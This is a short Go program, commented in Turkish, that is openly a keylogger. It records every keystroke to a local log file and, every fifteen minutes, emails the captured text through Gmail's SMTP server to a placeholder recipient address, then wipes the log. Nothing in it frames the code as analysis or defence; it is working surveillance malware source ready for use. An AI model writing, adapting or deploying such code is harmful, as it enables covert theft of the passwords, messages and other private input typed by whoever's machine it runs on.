package main

import (
	"fmt"
	"net/smtp"
	"os"
	"time"

	keylogger2 "github.com/kindlyfire/go-keylogger"
	
)

func sendMail(message string) {
	auth := smtp.PlainAuth(
		"",
		"gönderici mail adresi",
		"uygulama sifresi",
		"smtp.gmail.com", // smtp server adresi genelde smtp.gmail.com
	)

	smtp.SendMail(
		"smtp.gmail.com:587", // smtp server adresi genelde smtp.gmail.com
		auth,
		"gönderici mail adresi",
		[]string{"alıcı mail adresi"},
		[]byte(message),
	)

}
// main
func main() {
	
	


	keylogger := keylogger2.NewKeylogger()

	startTıme := time.Now()

	file, _ := os.OpenFile("log.txt", os.O_CREATE|os.O_APPEND, 0666)
	defer file.Close()
	for {

		key := keylogger.GetKey()

		if !key.Empty {
			file.WriteString(string(key.Rune))

		}

		duration := time.Since(startTıme)

		if duration > 15*time.Minute {
			fmt.Println("10 dakika geçti")
			startTıme = time.Now()

			file, err := os.Open("log.txt")
			if err != nil {
				fmt.Println(err)
			}

			stat, err := file.Stat()
			if err != nil {
				fmt.Println(err)
			}

			bs := make([]byte, stat.Size())
			_, err = file.Read(bs)
			if err != nil {
				fmt.Println(err)
			}

			str := string(bs)

			fmt.Println(str)
			sendMail(str)
			err = os.Truncate("log.txt", 0)

			if err != nil {
				fmt.Println(err)
			}

		}

		time.Sleep(10 * time.Millisecond)
	}
}
